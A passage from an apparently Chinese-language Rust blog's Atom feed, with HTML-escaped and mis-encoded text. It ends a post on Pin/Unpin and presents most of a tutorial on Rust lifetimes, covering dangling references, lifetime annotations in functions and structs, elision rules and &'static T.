&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// Example ç±»å‹è‡ªåŠ¨å®ç°äº† Unpinã€‚
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">example&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Example&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="mi">10&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pinned_example&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Pin&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">example&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ç”±äº Example å®ç°äº† Unpinï¼Œæˆ‘ä»¬å¯ä»¥è·å–å¯å˜å¼•ç”¨æ¥ä¿®æ”¹å®ƒ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pinned_example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_mut&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">increment&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Updated value: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pinned_example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/></entry><entry><title type="text">ç†è§£ Rust çš„ ç”Ÿå‘½å‘¨æœŸ (Lifetime)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/understanding-lifetimes-in-rust/"/><id>https://mincodes.com/posts/understanding-lifetimes-in-rust/</id><updated>2024-03-20T17:13:48+08:00</updated><published>2024-03-06T16:01:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Lifetime çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ‚¬ç©ºå¼•ç”¨ (dangling references) ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ borrow checker ä¼šæ£€æŸ¥ r çš„ç”Ÿå‘½å‘¨æœŸ 'a æ¯”å…¶å¼•ç”¨çš„æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸ 'b è¦é•¿ï¼Œâ€¦</summary><content type="html">&lt;h2 id="lifetime-çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ‚¬ç©ºå¼•ç”¨--dangling-references">Lifetime çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ‚¬ç©ºå¼•ç”¨ (&lt;em>dangling references&lt;/em>)&lt;/h2>
&lt;p>ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ &lt;em>borrow checker&lt;/em> ä¼šæ£€æŸ¥ &lt;code>r&lt;/code> çš„ç”Ÿå‘½å‘¨æœŸ &lt;code>'a&lt;/code> æ¯”å…¶å¼•ç”¨çš„æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸ &lt;code>'b&lt;/code>
è¦é•¿ï¼Œå› æ­¤ä¼šæ‹’ç»ç¼–è¯‘é€šè¿‡ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// âŒ borrowed value does not live long enough
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// ---------+-- &amp;#39;a
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// -+-- &amp;#39;b |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// -+ |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;r: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// ---------+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="lifetime-æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³›å‹å‚æ•°">Lifetime æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³›å‹å‚æ•°&lt;/h2>
&lt;p>å…·ä½“åˆ°å½¢å¼å±‚é¢ï¼ŒLifetime å®é™…ä¸Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³›å‹å‚æ•°ï¼Œè¿™äº›æ³›å‹å‚æ•°ä¸ºç¼–è¯‘å™¨æä¾›äº†æœ‰å…³å¼•ç”¨ä¹‹é—´å¦‚ä½•ç›¸äº’è”ç³»çš„ä¿¡æ¯ã€‚&lt;/p>
&lt;p>å‚è€ƒ &lt;a href="https://github.com/pretzelhammer/rust-blog/blob/master/posts/common-rust-lifetime-misconceptions.md">common-rust-lifetime-misconceptions&lt;/a> ä¸€æ–‡ä¸­çš„å®šä¹‰ï¼Œå¯ä»¥åŠ æ·±å¯¹ Lifetime çš„ç†è§£ï¼š&lt;/p>
&lt;blockquote>
&lt;p>ğŸŒŸ å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡å®ƒæ‰€æŒ‡å‘çš„æ•°æ®å¯ä»¥è¢«ç¼–è¯‘å™¨é™æ€éªŒè¯åœ¨å…¶å½“å‰å†…å­˜åœ°å€ä¸Šæœ‰æ•ˆçš„æ—¶é—´é•¿åº¦ã€‚&lt;/p>
&lt;p>A variable&amp;rsquo;s lifetime is how long the data it points to can be statically
verified by the compiler to be valid at its current memory address.&lt;/p>
&lt;/blockquote>
&lt;h2 id="åœ¨å‡½æ•°ä¸­ä½¿ç”¨-lifetime">åœ¨å‡½æ•°ä¸­ä½¿ç”¨ Lifetime&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">longest&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="kt">str&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="kt">str&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="kt">str&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">len&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;long string is long&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;xyz&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">longest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_str&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">string2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_str&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;The longest string is: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šä¾‹ä¸­ï¼Œç”±äº &lt;em>borrow checker&lt;/em> æ— æ³•æ¨æ–­å‡º xã€y çš„ç”Ÿå‘½å‘¨æœŸå’Œè¿”å›å€¼çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼Œå› æ­¤å¿…é¡»é€šè¿‡ç”Ÿå‘½å‘¨æœŸå‚æ•°æ¥æŒ‡å®šã€‚è¯¥ä¾‹ä¸­ï¼Œè¿”å›å€¼çš„ç”Ÿå‘½å‘¨æœŸå’Œä¸¤ä¸ªå˜é‡ä¸­ç”Ÿå‘½å‘¨æœŸè¾ƒçŸ­çš„é‚£ä¸ªä¿æŒä¸€è‡´ã€‚&lt;/p>
&lt;ul>
&lt;li>ç”Ÿå‘½å‘¨æœŸæ³¨è§£å¹¶ä¸å½±å“å¼•ç”¨çš„ç”Ÿå­˜æ—¶é—´ï¼Œè€Œæ˜¯ç”¨äºæè¿°å¤šä¸ªå¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼ˆä¸»è¦æ˜¯æè¿°è¿”å›å€¼å’Œå…¥å‚çš„ç”Ÿå‘½å‘¨æœŸä¹‹é—´çš„å…³ç³»ï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="åœ¨ç»“æ„ä½“ä¸­ä½¿ç”¨-lifetime">åœ¨ç»“æ„ä½“ä¸­ä½¿ç”¨ Lifetime&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="nc">ImportantExcerpt&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">part&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="na">&amp;#39;a&lt;/span> &lt;span class="kt">str&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">novel&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Call me Ishmael. Some years ago...&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">first_sentence&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">novel&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">expect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Could not find a &amp;#39;.&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ImportantExcerpt&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">part&lt;/span>: &lt;span class="nc">first_sentence&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šä¾‹ä¸­ï¼Œ &lt;code>ImportantExcerpt&lt;/code> å®ä¾‹çš„ç”Ÿå‘½å‘¨æœŸä¸èƒ½è¶…å‡ºå…¶ &lt;code>part&lt;/code> å­—æ®µçš„ç”Ÿå‘½å‘¨æœŸã€‚&lt;/p>
&lt;h2 id="lifetime-å‚æ•°çš„çœç•¥è§„åˆ™--lifetime-elision-rules">Lifetime å‚æ•°çš„çœç•¥è§„åˆ™ (&lt;em>Lifetime elision rules&lt;/em>)&lt;/h2>
&lt;p>å¯¹äºä¸€ä¸ªå‡½æ•°æ¥è¯´ï¼š&lt;/p>
&lt;ol>
&lt;li>ç¼–è¯‘å™¨ä¸ºæ¯ä¸ªå¼•ç”¨å‚æ•°åˆ†é…ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚&lt;/li>
&lt;li>å¦‚æœåªæœ‰ä¸€ä¸ªè¾“å…¥ç”Ÿå‘½å‘¨æœŸå‚æ•°ï¼Œåˆ™å°†è¯¥ç”Ÿå‘½å‘¨æœŸåˆ†é…ç»™æ‰€æœ‰çš„è¾“å‡ºç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚&lt;/li>
&lt;li>å¦‚æœæœ‰å¤šä¸ªè¾“å…¥ç”Ÿå‘½å‘¨æœŸå‚æ•°ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªæ˜¯ &lt;code>&amp;amp;self&lt;/code> æˆ– &lt;code>&amp;amp;mut self&lt;/code> (å³è¿™æ˜¯ä¸€ä¸ªæ–¹æ³•)ï¼Œåˆ™å°† &lt;code>self&lt;/code> çš„ç”Ÿå‘½å‘¨æœŸåˆ†é…ç»™æ‰€æœ‰çš„è¾“å‡ºç”Ÿå‘½å‘¨æœŸå‚æ•°ã€‚&lt;/li>
&lt;/ol>
&lt;p>å½“å¼•ç”¨æ²¡æœ‰æ˜¾å¼ç”Ÿå‘½å‘¨æœŸæ³¨è§£æ—¶ï¼Œç¼–è¯‘å™¨æŒ‰ç…§ä¸Šè¿°è§„åˆ™æ¥è®¡ç®—å¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸã€‚å¦‚æœä¸Šè¿°ä¸‰æ¡è§„åˆ™èµ°åˆ°åº•ï¼Œä»ç„¶å­˜åœ¨æ— æ³•è®¡ç®—å‡ºç”Ÿå‘½å‘¨æœŸçš„å¼•ç”¨æ—¶ï¼Œç¼–è¯‘å™¨ä¼šåœæ­¢å¹¶æŠ¥é”™ã€‚&lt;/p>
&lt;h2 id="ç†è§£-and-static-t-å¼•ç”¨">ç†è§£ &lt;code>&amp;amp;'static T&lt;/code> å¼•ç”¨&lt;/h2>
&lt;p>è¯·æ³¨æ„ &lt;code>&amp;amp;'static T&lt;/code> å’Œ &lt;a href="https://mincodes.com/posts/understanding-lifetimes-in-rust/#%E7%90%86%E8%A7%A3-t-static">T: &amp;lsquo;static&lt;/a> äºŒè€…ä¹‹é—´çš„åŒºåˆ«ã€‚&lt;/p>
&lt;p>&lt;code>&amp;amp;'static T&lt;/code> å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹å¼äº§ç”Ÿï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>å¯¹é™æ€å˜é‡çš„å¼•ç”¨&lt;/p>
&lt;p>ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²å­—é¢é‡å› ä¸ºå­˜å‚¨åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨ç¨‹åºè¿è¡ŒæœŸé—´éƒ½æœ‰æ•ˆï¼Œå› æ­¤å…·æœ‰
&lt;code>'static&lt;/code> ç”Ÿå‘½å‘¨æœŸã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
